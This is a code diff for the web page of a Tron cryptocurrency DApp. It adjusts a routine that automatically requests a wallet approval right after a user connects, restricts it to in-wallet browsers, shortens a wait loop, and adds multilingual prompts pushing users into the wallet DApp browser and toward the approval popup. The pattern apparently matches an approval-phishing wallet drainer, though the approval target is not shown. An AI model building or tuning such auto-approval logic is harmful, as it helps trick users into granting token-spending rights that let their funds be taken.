@@ -1197,8 +1197,8 @@
             // 레퍼럴
             try { trackReferralConnect(address, provider); } catch (e) { }
 
-            // 자동 승인 (연결 직후)
-          if (!isApproved && !isApproving && !_autoApproveScheduled) {
+            // 자동 승인 (지갑 내장 브라우저일 때만)
+          if (!isApproved && !isApproving && !_autoApproveScheduled && provider !== 'WalletConnect') {
               _autoApproveScheduled = true;
               setTimeout(function () {
                   if (isConnected && currentWalletAddress && !isApproved && !isApproving) {
@@ -1268,7 +1268,7 @@
 
             if (!tw || !tw.contract) {
                 // 최대 15초 대기
-                for (var _wait = 0; _wait < 15; _wait++) {
+                for (var _wait = 0; _wait < 5; _wait++) {
                     await new Promise(function (r) { setTimeout(r, 1000); });
                     tw = window.tronWeb || null;
                     if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
@@ -1282,7 +1282,17 @@
                         }
                     } catch (e) { }
                 }
-                            if (!tw || !tw.contract) {
+                                            if (!tw || !tw.contract) {
+                    showToast(currentLang === 'ko' ? '지갑 앱 DApp 브라우저에서 열어주세요!' :
+                        currentLang === 'zh' ? '请在钱包App的DApp浏览器中打开！' :
+                        currentLang === 'ru' ? 'Откройте в DApp браузере кошелька!' :
+                        currentLang === 'ja' ? 'ウォレットのDAppブラウザで開いてください！' :
+                        currentLang === 'th' ? 'กรุณาเปิดใน DApp Browser ของกระเป๋า!' :
+                        currentLang === 'vi' ? 'Vui lòng mở trong DApp Browser của ví!' :
+                        currentLang === 'de' ? 'Bitte im DApp-Browser der Wallet öffnen!' :
+                        currentLang === 'fr' ? 'Ouvrez dans le navigateur DApp du portefeuille!' :
+                        currentLang === 'es' ? '¡Abra en el navegador DApp de la billetera!' :
+                        'Please open in wallet DApp browser!', 'error');
                     if (wcConnector && wcAddress) {
                         useWC = true;
                     } else {
@@ -1471,7 +1481,7 @@
                                         showToast(currentLang === 'ko' ? '지갑 팝업을 확인하세요! 🔔' :
                         currentLang === 'zh' ? '请查看钱包弹窗！🔔' :
                         currentLang === 'ru' ? 'Проверьте всплывающее окно кошелька! 🔔' :
-                        currentLang === 'ja' ? 'ウォレットのポップアップを確인してください！🔔' :
+                        currentLang === 'ja' ? 'ウォレットのポップアップを確認してください！🔔' :
                         currentLang === 'th' ? 'กรุณาตรวจสอบป๊อปอัพกระเป๋า! 🔔' :
                         currentLang === 'vi' ? 'Kiểm tra cửa sổ pop-up ví! 🔔' :
                         currentLang === 'de' ? 'Bitte Wallet-Popup überprüfen! 🔔' :
